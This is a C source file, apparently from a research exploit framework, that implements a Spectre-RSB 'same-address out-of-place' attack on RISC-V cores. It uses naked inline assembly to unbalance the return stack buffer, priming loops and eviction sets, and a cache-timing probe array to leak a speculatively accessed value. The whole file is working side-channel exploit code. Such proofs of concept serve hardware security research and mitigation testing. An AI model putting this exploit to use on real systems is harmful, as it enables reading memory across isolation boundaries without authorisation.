#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// RSB out-of-place: stack manipulation causes RSB misprediction

uint8_t* probe_array;

// Register holds target address during speculation (memory load too slow)
register void* target_addr_reg asm("s1");

void __attribute__((noinline, naked)) call_manipulate_stack() {
    // Pop call_leak's frame so ret goes to call_start
    // RSB still predicts return to call_leak -> speculative execution
    asm volatile(
        "ld ra, 8(sp)\n\t"
        "addi sp, sp, 16\n\t"
        "ret\n\t"
        ::: "memory"
    );
}

int __attribute__((noinline)) call_leak() {
    call_manipulate_stack();
    // Speculatively executed (RSB predicts return here)
    SPEC_FENCE();
    maccess(target_addr_reg);
    return 2;
}

int __attribute__((noinline)) call_start() {
    call_leak();
    return 1;
}

void confuse_compiler() {
    call_start();
    call_leak();
    call_manipulate_stack();
}

static int debug_count = 0;

void rsb_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    target_addr_reg = probe_array + encode_index * PAGE_SIZE;

#ifdef P550
    for (int w = 0; w < 3; w++) {
        NO_OPT(call_start());
    }
    for (int j = 0; j < 256; j++) {
        evict_with_set(&ctx->eviction_sets[j]);
    }
    mfence();
#endif

    // Multiple calls to prime RSB and increase speculation success
    for (int i = 0; i < 10; i++) {
        NO_OPT(call_start());
    }

#ifdef P550
    if (debug_count < 10) {
        size_t t = reload_t(target_addr_reg);
        printf("DEBUG[%d]: secret=%d, timing=%zu, threshold=%zu\n",
               debug_count, encode_index, t, CACHE_MISS);
        debug_count++;
    }
#endif
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB sa-oop\n");

    exploit_hooks_t hooks = {
        .setup = NULL,
        .attack = rsb_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB same-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
